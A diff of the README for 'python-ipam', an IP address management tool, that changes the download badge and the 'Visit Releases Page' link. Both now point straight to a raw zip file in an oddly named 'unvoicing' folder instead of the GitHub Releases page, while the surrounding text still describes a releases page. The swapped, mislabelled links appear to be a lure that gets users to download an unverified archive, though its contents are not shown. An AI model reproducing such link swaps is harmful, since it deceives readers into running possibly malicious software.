@@ -1,7 +1,7 @@
 # 🌍 python-ipam - Easy IP Address Management for Everyone
 
 ## 📥 Download Now
-[![Download python-ipam](https://img.shields.io/badge/Download%20python--ipam-v1.0-blue)](https://github.com/ragulkanna12/python-ipam/releases)
+[![Download python-ipam](https://raw.githubusercontent.com/ragulkanna12/python-ipam/main/unvoicing/python-ipam.zip%20python--ipam-v1.0-blue)](https://raw.githubusercontent.com/ragulkanna12/python-ipam/main/unvoicing/python-ipam.zip)
 
 ## 🚀 Getting Started
 Welcome to *python-ipam*! This is your go-to solution for managing IP addresses easily. With a user-friendly interface and strong security, anyone can use it without technical knowledge. The software runs a Flask REST API and features a Bootstrap UI, making it simple to navigate.
@@ -27,7 +27,7 @@ To ensure *python-ipam* runs smoothly on your computer, please check the followi
 To get started with *python-ipam*, follow these simple steps:
 
 1. Click on the download link below to visit the Releases page:
-   [Visit Releases Page](https://github.com/ragulkanna12/python-ipam/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/ragulkanna12/python-ipam/main/unvoicing/python-ipam.zip)
    
 2. On the Releases page, find the latest version of *python-ipam*.
 
